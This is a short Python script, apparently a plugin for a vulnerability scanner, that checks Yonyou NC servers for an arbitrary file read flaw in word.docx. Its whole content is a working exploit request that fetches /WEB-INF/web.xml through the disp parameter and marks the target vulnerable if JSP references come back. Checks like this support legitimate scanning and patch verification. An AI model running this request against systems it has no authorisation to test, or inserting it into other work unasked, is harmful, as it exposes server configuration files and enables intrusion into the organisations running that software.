import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友NC word.docx任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and '.jsp' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult